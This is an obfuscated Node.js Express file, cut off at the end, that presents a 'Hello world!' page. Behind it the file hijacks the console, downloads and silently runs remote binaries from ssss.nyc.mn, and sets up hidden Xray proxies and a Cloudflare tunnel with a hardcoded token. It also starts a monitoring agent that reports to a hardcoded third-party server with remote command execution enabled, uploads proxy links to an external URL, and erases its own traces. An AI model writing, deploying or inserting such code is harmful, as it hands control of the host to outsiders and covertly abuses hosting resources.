const _0x5c84dc=_0x2566;(function(_0x1af0cc,_0x1b294b){const _0x374a88=_0x2566,_0x3a8533=_0x1af0cc();while(!![]){try{const _0x285be3=parseInt(_0x374a88(0x1cc))/0x1+-parseInt(_0x374a88(0x231))/0x2*(-parseInt(_0x374a88(0x1b6))/0x3)+parseInt(_0x374a88(0x1a8))/0x4+parseInt(_0x374a88(0x22a))/0x5*(-parseInt(_0x374a88(0x1fc))/0x6)+parseInt(_0x374a88(0x259))/0x7+-parseInt(_0x374a88(0x261))/0x8+parseInt(_0x374a88(0x204))/0x9*(-parseInt(_0x374a88(0x23c))/0xa);if(_0x285be3===_0x1b294b)break;else _0x3a8533['push'](_0x3a8533['shift']());}catch(_0x10092d){_0x3a8533['push'](_0x3a8533['shift']());}}}(_0x3045,0xa1191));function _0x3045(){const _0x25e104=['php\x20running\x20error:\x20','false','2545990IvtGhD','NEZHA_KEY','https+local://8.8.8.8/dns-query','http','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','Add\x20automatic\x20access\x20task\x20faild:\x20','all','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/v1','\x20is\x20running','forEach','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','FILE_PATH','tunnel.yml','ARGO_DOMAIN','get','vless','statSync','ArgoDomain:','ARGO_PORT','unshift','/vless-argo','fileName','chmod','tcp','then','catch','readFileSync','apply','3862586pRJSPr','Error\x20executing\x20command:\x20','\x22\x20>\x20/dev/null\x202>&1','set','true','fileUrl','?encryption=none&security=tls&sni=','mkdirSync','5852368oVLjMg','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','?security=tls&sni=','.exe\x20>\x20nul\x202>&1','clear','table','application/json','toString','has','App\x20is\x20running','(((.+)+)+)+$','send','quic','win32','finish','config.yaml','/config.json\x20>/dev/null\x202>&1\x20&','3407380FWzbCx','SUB_PATH','match','nohup\x20','stream','/vmess-argo?ed=2560','arm64','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','tls','Hello\x20world!','boot.log','https://arm64.ssss.nyc.mn/bot','UUID','stringify','1458pCvgAh','block','env','/trojan-argo','charAt','substring','/api/add-subscriptions','k6qzrDL9Sttsfl4TOAQlL98DSnLG1Va5','\x0aclient_secret:\x20','basename','\x20>/dev/null\x202>&1\x20&','push','xtls-rprx-vision','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','CFPORT','length','PORT','filter','eyJhIjoiZTNlYmU5NDY1NjJjOGZjMjBmYzg4Y2U5MGJlODRjYTMiLCJ0IjoiNjE1MGMwMWQtZTFmZS00YTA2LWI2MjctNzUyNWNlNGNiMGIzIiwicyI6Ik4yRmpZVGsyTkdFdFpXVmhNaTAwTUdNNExUazFNVGN0WTJSbFpERTBNemxtWWprdyJ9','UPLOAD_URL','amd','Subscription\x20uploaded\x20successfully','327995eTMqqN','&path=%2Ftrojan-argo%3Fed%3D2560#','join','text/plain;\x20charset=utf-8','map','\x20is\x20created','automatic\x20access\x20task\x20added\x20successfully','utf-8','Download\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','split','writeFileSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','web\x20running\x20error:\x20','config.json','jianxianapp','\x20>\x20nul\x202>&1','aarch64','2096','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','firefox','existsSync','message','443','https://amd64.ssss.nyc.mn/v1','CFIP','https://arm64.ssss.nyc.mn/agent','trojan','\x0a\x20\x20\x0atrojan://','includes','/api/add-nodes','data','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2083','constructor','/tunnel.yml\x20run','taskkill\x20/f\x20/im\x20','Error\x20in\x20startserver:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','platform','zerbur.jianxian.nyc.mn','freedom','util','log','readdirSync','Error\x20downloading\x20files:','error','8443','11022HZNNof','jianxian.apkk.cloudns.org:56808','f5b99300-e8a1-4441-981d-53022c98a09a','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http\x20server\x20is\x20running\x20on\x20port:','bind','NEZHA_SERVER','18GZgIqk','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','list.txt','\x20successfully','https://arm64.ssss.nyc.mn/web','Error\x20reading\x20boot.log:','ARGO_DOMAIN:','isFile','/vmess-argo','sub.txt','\x0a\x20\x20tunnel:\x20','\x20failed:\x20','https://amd64.ssss.nyc.mn/bot','Unhandled\x20error\x20in\x20startserver:','response','127.0.0.1','Content-Type','search','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','AUTO_ACCESS','close','trace','arm','base64','createWriteStream','2053','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0avless://','blackhole','2087','NAME','Skipping\x20adding\x20automatic\x20access\x20task','npm\x20running\x20error:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/dev/null','\x20-c\x20','floor','15txBdCU','pkill\x20-f\x20\x22[','Empowerment\x20success\x20for\x20','Nodes\x20uploaded\x20successfully','from','none','post','718lgCRJT','zeabur-us','del\x20/f\x20/q\x20','random','{}.constructor(\x22return\x20this\x22)(\x20)','status','tunnel.json','\x20>/dev/null\x202>&1','ARGO_AUTH'];_0x3045=function(){return _0x25e104;};return _0x3045();}const _0x232f49=(function(){let _0x49cc4a=!![];return function(_0x1dd9d0,_0x3d7f29){const _0xdb2835=_0x49cc4a?function(){const _0x84ea66=_0x2566;if(_0x3d7f29){const _0x557496=_0x3d7f29[_0x84ea66(0x258)](_0x1dd9d0,arguments);return _0x3d7f29=null,_0x557496;}}:function(){};return _0x49cc4a=![],_0xdb2835;};}()),_0x42ae34=_0x232f49(this,function(){const _0x341a97=_0x2566;return _0x42ae34[_0x341a97(0x19e)]()['search'](_0x341a97(0x1a1))[_0x341a97(0x19e)]()[_0x341a97(0x1ee)](_0x42ae34)[_0x341a97(0x215)](_0x341a97(0x1a1));});_0x42ae34();const _0x37f25c=(function(){let _0x38c905=!![];return function(_0x9907c9,_0x1bf08b){const _0xfbb89f=_0x38c905?function(){if(_0x1bf08b){const _0x9234e3=_0x1bf08b['apply'](_0x9907c9,arguments);return _0x1bf08b=null,_0x9234e3;}}:function(){};return _0x38c905=![],_0xfbb89f;};}()),_0x2d168c=_0x37f25c(this,function(){const _0x4ed0dd=_0x2566;let _0x2da2b6;try{const _0x2e0757=Function('return\x20(function()\x20'+_0x4ed0dd(0x235)+');');_0x2da2b6=_0x2e0757();}catch(_0x1eb6bb){_0x2da2b6=window;}const _0x429297=_0x2da2b6['console']=_0x2da2b6['console']||{},_0x8712ec=['log','warn','info',_0x4ed0dd(0x1fa),'exception',_0x4ed0dd(0x19c),_0x4ed0dd(0x21a)];for(let _0x543564=0x0;_0x543564<_0x8712ec[_0x4ed0dd(0x1c5)];_0x543564++){const _0x2dab79=_0x37f25c[_0x4ed0dd(0x1ee)]['prototype'][_0x4ed0dd(0x202)](_0x37f25c),_0x123435=_0x8712ec[_0x543564],_0x283568=_0x429297[_0x123435]||_0x2dab79;_0x2dab79['__proto__']=_0x37f25c[_0x4ed0dd(0x202)](_0x37f25c),_0x2dab79['toString']=_0x283568[_0x4ed0dd(0x19e)]['bind'](_0x283568),_0x429297[_0x123435]=_0x2dab79;}});_0x2d168c();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5c84dc(0x1f6)),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x1c9)]||'',PROJECT_URL=process[_0x5c84dc(0x1b8)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x5c84dc(0x218)]||!![],FILE_PATH=process['env'][_0x5c84dc(0x248)]||'./tmp',SUB_PATH=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x1a9)]||_0x5c84dc(0x1db),PORT=process[_0x5c84dc(0x1b8)]['SERVER_PORT']||process[_0x5c84dc(0x1b8)][_0x5c84dc(0x1c6)]||0xbb8,UUID=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x1b4)]||_0x5c84dc(0x1fe),NEZHA_SERVER=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x203)]||_0x5c84dc(0x1fd),NEZHA_PORT=process[_0x5c84dc(0x1b8)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x5c84dc(0x23d)]||_0x5c84dc(0x1bd),ARGO_DOMAIN=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x24a)]||_0x5c84dc(0x1f4),ARGO_AUTH=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x239)]||_0x5c84dc(0x1c8),ARGO_PORT=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x24f)]||0x1f41,CFIP=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x1e5)]||'104.18.4.250',CFPORT=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x1c4)]||0x1bb,NAME=process[_0x5c84dc(0x1b8)][_0x5c84dc(0x223)]||_0x5c84dc(0x232);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x5c84dc(0x1d1))):console[_0x5c84dc(0x1f7)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x58ebdb=_0x5c84dc,_0x4e543a='abcdefghijklmnopqrstuvwxyz';let _0x3e040e='';for(let _0x1f3d76=0x0;_0x1f3d76<0x6;_0x1f3d76++){_0x3e040e+=_0x4e543a[_0x58ebdb(0x1ba)](Math[_0x58ebdb(0x229)](Math[_0x58ebdb(0x234)]()*_0x4e543a[_0x58ebdb(0x1c5)]));}return _0x3e040e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5c84dc(0x1ce)](FILE_PATH,npmName),phpPath=path[_0x5c84dc(0x1ce)](FILE_PATH,phpName),webPath=path[_0x5c84dc(0x1ce)](FILE_PATH,webName),botPath=path[_0x5c84dc(0x1ce)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x5c84dc(0x20d)),listPath=path[_0x5c84dc(0x1ce)](FILE_PATH,_0x5c84dc(0x206)),bootLogPath=path[_0x5c84dc(0x1ce)](FILE_PATH,_0x5c84dc(0x1b2)),configPath=path[_0x5c84dc(0x1ce)](FILE_PATH,_0x5c84dc(0x1da));function deleteNodes(){const _0xe61159=_0x5c84dc;try{if(!UPLOAD_URL)return;if(!fs[_0xe61159(0x1e1)](subPath))return;let _0x4297e6;try{_0x4297e6=fs[_0xe61159(0x257)](subPath,_0xe61159(0x1d3));}catch{return null;}const _0xe498d0=Buffer[_0xe61159(0x22e)](_0x4297e6,_0xe61159(0x21c))[_0xe61159(0x19e)](_0xe61159(0x1d3)),_0x31c61e=_0xe498d0[_0xe61159(0x1d6)]('\x0a')[_0xe61159(0x1c7)](_0x56168c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x56168c));if(_0x31c61e[_0xe61159(0x1c5)]===0x0)return;return axios[_0xe61159(0x230)](UPLOAD_URL+'/api/delete-nodes',JSON[_0xe61159(0x1b5)]({'nodes':_0x31c61e}),{'headers':{'Content-Type':_0xe61159(0x19d)}})[_0xe61159(0x256)](_0x3f507e=>{return null;}),null;}catch(_0x305b1a){return null;}}function cleanupOldFiles(){const _0xe11e57=_0x5c84dc;try{const _0x470445=fs[_0xe11e57(0x1f8)](FILE_PATH);_0x470445[_0xe11e57(0x246)](_0x1defbd=>{const _0x1eaaf6=_0xe11e57,_0x4e576f=path[_0x1eaaf6(0x1ce)](FILE_PATH,_0x1defbd);try{const _0x459c2a=fs[_0x1eaaf6(0x24d)](_0x4e576f);_0x459c2a[_0x1eaaf6(0x20b)]()&&fs[_0x1eaaf6(0x1ff)](_0x4e576f);}catch(_0xe57521){}});}catch(_0x362ebd){}}app[_0x5c84dc(0x24b)]('/',function(_0x279188,_0x2a967f){const _0x448ced=_0x5c84dc;_0x2a967f[_0x448ced(0x1a2)](_0x448ced(0x1b1));});async function generateConfig(){const _0x39f049=_0x5c84dc,_0x336c2f={'log':{'access':_0x39f049(0x227),'error':_0x39f049(0x227),'loglevel':_0x39f049(0x22f)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x39f049(0x24c),'settings':{'clients':[{'id':UUID,'flow':_0x39f049(0x1c2)}],'decryption':_0x39f049(0x22f),'fallbacks':[{'dest':0xbb9},{'path':_0x39f049(0x251),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x39f049(0x1b9),'dest':0xbbc}]},'streamSettings':{'network':_0x39f049(0x254)}},{'port':0xbb9,'listen':_0x39f049(0x213),'protocol':_0x39f049(0x24c),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x39f049(0x22f)}},{'port':0xbba,'listen':_0x39f049(0x213),'protocol':_0x39f049(0x24c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x39f049(0x22f)},'streamSettings':{'network':'ws','security':_0x39f049(0x22f),'wsSettings':{'path':_0x39f049(0x251)}},'sniffing':{'enabled':!![],'destOverride':[_0x39f049(0x23f),_0x39f049(0x1b0),_0x39f049(0x1a3)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x39f049(0x213),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x39f049(0x20c)}},'sniffing':{'enabled':!![],'destOverride':[_0x39f049(0x23f),'tls',_0x39f049(0x1a3)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x39f049(0x213),'protocol':_0x39f049(0x1e7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x39f049(0x22f),'wsSettings':{'path':_0x39f049(0x1b9)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x39f049(0x1b0),_0x39f049(0x1a3)],'metadataOnly':![]}}],'dns':{'servers':[_0x39f049(0x23e)]},'outbounds':[{'protocol':_0x39f049(0x1f5),'tag':'direct'},{'protocol':_0x39f049(0x221),'tag':_0x39f049(0x1b7)}]};fs[_0x39f049(0x1d7)](path['join'](FILE_PATH,_0x39f049(0x1da)),JSON[_0x39f049(0x1b5)](_0x336c2f,null,0x2));}function getSystemArchitecture(){const _0x5e379b=_0x5c84dc,_0x5ae533=os['arch']();return _0x5ae533==='arm'||_0x5ae533===_0x5e379b(0x1ae)||_0x5ae533===_0x5e379b(0x1dd)?_0x5e379b(0x21b):_0x5e379b(0x1ca);}function downloadFile(_0xda631f,_0x140617,_0x220cf9){const _0x281d63=_0x5c84dc,_0x212db4=_0xda631f;!fs[_0x281d63(0x1e1)](FILE_PATH)&&fs[_0x281d63(0x260)](FILE_PATH,{'recursive':!![]});const _0x39fda6=fs[_0x281d63(0x21d)](_0x212db4);axios({'method':_0x281d63(0x24b),'url':_0x140617,'responseType':_0x281d63(0x1ac)})[_0x281d63(0x255)](_0x343aa0=>{const _0x57b343=_0x281d63;_0x343aa0[_0x57b343(0x1eb)]['pipe'](_0x39fda6),_0x39fda6['on'](_0x57b343(0x1a5),()=>{const _0x327dfe=_0x57b343;_0x39fda6[_0x327dfe(0x219)](),console['log'](_0x327dfe(0x1d4)+path[_0x327dfe(0x1bf)](_0x212db4)+_0x327dfe(0x207)),_0x220cf9(null,_0x212db4);}),_0x39fda6['on'](_0x57b343(0x1fa),_0x15969b=>{const _0x21a235=_0x57b343;fs['unlink'](_0x212db4,()=>{});const _0x25afa3=_0x21a235(0x1d4)+path['basename'](_0x212db4)+_0x21a235(0x20f)+_0x15969b['message'];console[_0x21a235(0x1fa)](_0x25afa3),_0x220cf9(_0x25afa3);});})['catch'](_0x57fd68=>{const _0x59be10=_0x281d63,_0x2b0019='Download\x20'+path[_0x59be10(0x1bf)](_0x212db4)+'\x20failed:\x20'+_0x57fd68['message'];console[_0x59be10(0x1fa)](_0x2b0019),_0x220cf9(_0x2b0019);});}async function downloadFilesAndRun(){const _0x524a18=_0x5c84dc,_0x1db073=getSystemArchitecture(),_0x4458d7=getFilesForArchitecture(_0x1db073);if(_0x4458d7[_0x524a18(0x1c5)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2f9f82=_0x4458d7[_0x524a18(0x1d0)](_0x548aca=>{return new Promise((_0x2d286f,_0x43e143)=>{const _0x2e11f9=_0x2566;downloadFile(_0x548aca[_0x2e11f9(0x252)],_0x548aca[_0x2e11f9(0x25e)],(_0x47ee6a,_0x1905fa)=>{_0x47ee6a?_0x43e143(_0x47ee6a):_0x2d286f(_0x1905fa);});});});try{await Promise[_0x524a18(0x242)](_0x2f9f82);}catch(_0x443f10){console[_0x524a18(0x1fa)](_0x524a18(0x1f9),_0x443f10);return;}function _0x501461(_0x3b221c){const _0x308643=_0x524a18,_0x35e96a=0x1fd;_0x3b221c[_0x308643(0x246)](_0x4f558b=>{const _0x504f8c=_0x308643;fs[_0x504f8c(0x1e1)](_0x4f558b)&&fs[_0x504f8c(0x253)](_0x4f558b,_0x35e96a,_0x2abb22=>{const _0x4e4e03=_0x504f8c;_0x2abb22?console[_0x4e4e03(0x1fa)]('Empowerment\x20failed\x20for\x20'+_0x4f558b+':\x20'+_0x2abb22):console[_0x4e4e03(0x1f7)](_0x4e4e03(0x22c)+_0x4f558b+':\x20'+_0x35e96a['toString'](0x8));});});}const _0x5a43db=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x501461(_0x5a43db);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xf4178b=NEZHA_SERVER[_0x524a18(0x1e9)](':')?NEZHA_SERVER[_0x524a18(0x1d6)](':')['pop']():'',_0x25b349=new Set([_0x524a18(0x1e3),_0x524a18(0x1fb),_0x524a18(0x1de),_0x524a18(0x222),_0x524a18(0x1ed),_0x524a18(0x21e)]),_0x5c0265=_0x25b349[_0x524a18(0x19f)](_0xf4178b)?_0x524a18(0x25d):_0x524a18(0x23b),_0xc18544=_0x524a18(0x1be)+NEZHA_KEY+_0x524a18(0x217)+NEZHA_SERVER+_0x524a18(0x1f2)+_0x5c0265+_0x524a18(0x1ec)+UUID;fs[_0x524a18(0x1d7)](path[_0x524a18(0x1ce)](FILE_PATH,_0x524a18(0x1a6)),_0xc18544);const _0x3f4b65=_0x524a18(0x1ab)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x524a18(0x21f);try{await exec(_0x3f4b65),console[_0x524a18(0x1f7)](phpName+_0x524a18(0x245)),await new Promise(_0x3d06c2=>setTimeout(_0x3d06c2,0x3e8));}catch(_0x7075b1){console[_0x524a18(0x1fa)](_0x524a18(0x23a)+_0x7075b1);}}else{let _0x232399='';const _0x720015=[_0x524a18(0x1e3),_0x524a18(0x1fb),'2096',_0x524a18(0x222),_0x524a18(0x1ed),'2053'];_0x720015[_0x524a18(0x1e9)](NEZHA_PORT)&&(_0x232399='--tls');const _0x8ff358=_0x524a18(0x1ab)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x232399+_0x524a18(0x205);try{await exec(_0x8ff358),console[_0x524a18(0x1f7)](npmName+'\x20is\x20running'),await new Promise(_0x584894=>setTimeout(_0x584894,0x3e8));}catch(_0x2c93c6){console[_0x524a18(0x1fa)](_0x524a18(0x225)+_0x2c93c6);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x15b371=_0x524a18(0x1ab)+webPath+_0x524a18(0x228)+FILE_PATH+_0x524a18(0x1a7);try{await exec(_0x15b371),console[_0x524a18(0x1f7)](webName+'\x20is\x20running'),await new Promise(_0x81de0e=>setTimeout(_0x81de0e,0x3e8));}catch(_0x43c0bb){console[_0x524a18(0x1fa)](_0x524a18(0x1d9)+_0x43c0bb);}if(fs[_0x524a18(0x1e1)](botPath)){let _0x4d0ab0;if(ARGO_AUTH[_0x524a18(0x1aa)](/^[A-Z0-9a-z=]{120,250}$/))_0x4d0ab0=_0x524a18(0x1af)+ARGO_AUTH;else ARGO_AUTH[_0x524a18(0x1aa)](/TunnelSecret/)?_0x4d0ab0=_0x524a18(0x1df)+FILE_PATH+_0x524a18(0x1ef):_0x4d0ab0=_0x524a18(0x200)+FILE_PATH+_0x524a18(0x1d8)+ARGO_PORT;try{await exec(_0x524a18(0x1ab)+botPath+'\x20'+_0x4d0ab0+_0x524a18(0x1c0)),console[_0x524a18(0x1f7)](botName+_0x524a18(0x245)),await new Promise(_0x534f9b=>setTimeout(_0x534f9b,0x7d0));}catch(_0x57594b){console[_0x524a18(0x1fa)](_0x524a18(0x25a)+_0x57594b);}}await new Promise(_0x36d2c4=>setTimeout(_0x36d2c4,0x1388));}function getFilesForArchitecture(_0x337cd7){const _0x178839=_0x5c84dc;let _0x16bec5;_0x337cd7===_0x178839(0x21b)?_0x16bec5=[{'fileName':webPath,'fileUrl':_0x178839(0x208)},{'fileName':botPath,'fileUrl':_0x178839(0x1b3)}]:_0x16bec5=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x178839(0x210)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x42c786=_0x337cd7===_0x178839(0x21b)?_0x178839(0x1e6):'https://amd64.ssss.nyc.mn/agent';_0x16bec5[_0x178839(0x250)]({'fileName':npmPath,'fileUrl':_0x42c786});}else{const _0x3bd3b7=_0x337cd7==='arm'?_0x178839(0x244):_0x178839(0x1e4);_0x16bec5[_0x178839(0x250)]({'fileName':phpPath,'fileUrl':_0x3bd3b7});}}return _0x16bec5;}function argoType(){const _0x535ddb=_0x5c84dc;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x535ddb(0x1c3));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x535ddb(0x1d7)](path[_0x535ddb(0x1ce)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x4a7d0b=_0x535ddb(0x20e)+ARGO_AUTH[_0x535ddb(0x1d6)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x535ddb(0x1ce)](FILE_PATH,_0x535ddb(0x237))+_0x535ddb(0x247)+ARGO_DOMAIN+_0x535ddb(0x216)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x535ddb(0x1d7)](path[_0x535ddb(0x1ce)](FILE_PATH,_0x535ddb(0x249)),_0x4a7d0b);}else console[_0x535ddb(0x1f7)](_0x535ddb(0x226));}argoType();async function extractDomains(){const _0x474574=_0x5c84dc;let _0x4491e6;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4491e6=ARGO_DOMAIN,console[_0x474574(0x1f7)](_0x474574(0x20a),_0x4491e6),await _0x45ea41(_0x4491e6);else try{const _0xda8556=fs[_0x474574(0x257)](path[_0x474574(0x1ce)](FILE_PATH,_0x474574(0x1b2)),_0x474574(0x1d3)),_0x503bd=_0xda8556[_0x474574(0x1d6)]('\x0a'),_0xe223b9=[];_0x503bd[_0x474574(0x246)](_0x51d7b0=>{const _0x514dc5=_0x474574,_0x4f7210=_0x51d7b0[_0x514dc5(0x1aa)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4f7210){const _0x5d56a4=_0x4f7210[0x1];_0xe223b9['push'](_0x5d56a4);}});if(_0xe223b9[_0x474574(0x1c5)]>0x0)_0x4491e6=_0xe223b9[0x0],console[_0x474574(0x1f7)](_0x474574(0x24e),_0x4491e6),await _0x45ea41(_0x4491e6);else{console['log'](_0x474574(0x1d5)),fs[_0x474574(0x1ff)](path[_0x474574(0x1ce)](FILE_PATH,'boot.log'));async function _0x31da30(){const _0x4a29f0=_0x474574;try{process[_0x4a29f0(0x1f3)]===_0x4a29f0(0x1a4)?await exec(_0x4a29f0(0x1f0)+botName+_0x4a29f0(0x264)):await exec(_0x4a29f0(0x22b)+botName['charAt'](0x0)+']'+botName[_0x4a29f0(0x1bb)](0x1)+_0x4a29f0(0x25b));}catch(_0x371c0f){}}_0x31da30(),await new Promise(_0x375bd2=>setTimeout(_0x375bd2,0xbb8));const _0x5a53e9=_0x474574(0x200)+FILE_PATH+_0x474574(0x1d8)+ARGO_PORT;try{await exec(_0x474574(0x1ab)+botPath+'\x20'+_0x5a53e9+_0x474574(0x1c0)),console[_0x474574(0x1f7)](botName+_0x474574(0x245)),await new Promise(_0x3a13f9=>setTimeout(_0x3a13f9,0xbb8)),await extractDomains();}catch(_0x185f1b){console[_0x474574(0x1fa)](_0x474574(0x25a)+_0x185f1b);}}}catch(_0x19cb91){console[_0x474574(0x1fa)](_0x474574(0x209),_0x19cb91);}async function _0x45ea41(_0x4140fb){const _0x46d318=_0x474574,_0x48222b=execSync(_0x46d318(0x240),{'encoding':_0x46d318(0x1d3)}),_0x431dae=_0x48222b['trim'](),_0x4635b4=NAME?NAME+'-'+_0x431dae:_0x431dae;return new Promise(_0x5bfc20=>{setTimeout(()=>{const _0x3c2064=_0x2566,_0x96fdc8={'v':'2','ps':''+_0x4635b4,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3c2064(0x22f),'net':'ws','type':_0x3c2064(0x22f),'host':_0x4140fb,'path':_0x3c2064(0x1ad),'tls':_0x3c2064(0x1b0),'sni':_0x4140fb,'alpn':'','fp':_0x3c2064(0x1e0)},_0x550d31=_0x3c2064(0x220)+UUID+'@'+CFIP+':'+CFPORT+_0x3c2064(0x25f)+_0x4140fb+'&fp=firefox&type=ws&host='+_0x4140fb+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4635b4+'\x0a\x20\x20\x0avmess://'+Buffer[_0x3c2064(0x22e)](JSON[_0x3c2064(0x1b5)](_0x96fdc8))['toString'](_0x3c2064(0x21c))+_0x3c2064(0x1e8)+UUID+'@'+CFIP+':'+CFPORT+_0x3c2064(0x263)+_0x4140fb+'&fp=firefox&type=ws&host='+_0x4140fb+_0x3c2064(0x1cd)+_0x4635b4+'\x0a\x20\x20\x20\x20';console[_0x3c2064(0x1f7)](Buffer['from'](_0x550d31)[_0x3c2064(0x19e)](_0x3c2064(0x21c))),fs[_0x3c2064(0x1d7)](subPath,Buffer['from'](_0x550d31)[_0x3c2064(0x19e)](_0x3c2064(0x21c))),console[_0x3c2064(0x1f7)](FILE_PATH+_0x3c2064(0x243)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x332836,_0x59ed57)=>{const _0x2d84ca=_0x3c2064,_0x57e010=Buffer[_0x2d84ca(0x22e)](_0x550d31)[_0x2d84ca(0x19e)](_0x2d84ca(0x21c));_0x59ed57[_0x2d84ca(0x25c)](_0x2d84ca(0x214),_0x2d84ca(0x1cf)),_0x59ed57[_0x2d84ca(0x1a2)](_0x57e010);}),_0x5bfc20(_0x550d31);},0x7d0);});}}async function uploadNodes(){const _0x294680=_0x5c84dc;if(UPLOAD_URL&&PROJECT_URL){const _0x16a0aa=PROJECT_URL+'/'+SUB_PATH,_0x5dd43c={'subscription':[_0x16a0aa]};try{const _0x1cfc60=await axios[_0x294680(0x230)](UPLOAD_URL+_0x294680(0x1bc),_0x5dd43c,{'headers':{'Content-Type':_0x294680(0x19d)}});return _0x1cfc60&&_0x1cfc60[_0x294680(0x236)]===0xc8?(console[_0x294680(0x1f7)](_0x294680(0x1cb)),_0x1cfc60):null;}catch(_0x4985a9){if(_0x4985a9[_0x294680(0x212)]){if(_0x4985a9['response'][_0x294680(0x236)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2f56c1=fs[_0x294680(0x257)](listPath,'utf-8'),_0x318716=_0x2f56c1[_0x294680(0x1d6)]('\x0a')[_0x294680(0x1c7)](_0x18c714=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x18c714));if(_0x318716[_0x294680(0x1c5)]===0x0)return;const _0xa6a3b9=JSON[_0x294680(0x1b5)]({'nodes':_0x318716});try{const _0x340aa6=await axios['post'](UPLOAD_URL+_0x294680(0x1ea),_0xa6a3b9,{'headers':{'Content-Type':_0x294680(0x19d)}});return _0x340aa6&&_0x340aa6['status']===0xc8?(console[_0x294680(0x1f7)](_0x294680(0x22d)),_0x340aa6):null;}catch(_0x510a69){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x229748=_0x2566,_0x1fcfff=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1fcfff[_0x229748(0x1c1)](npmPath);else 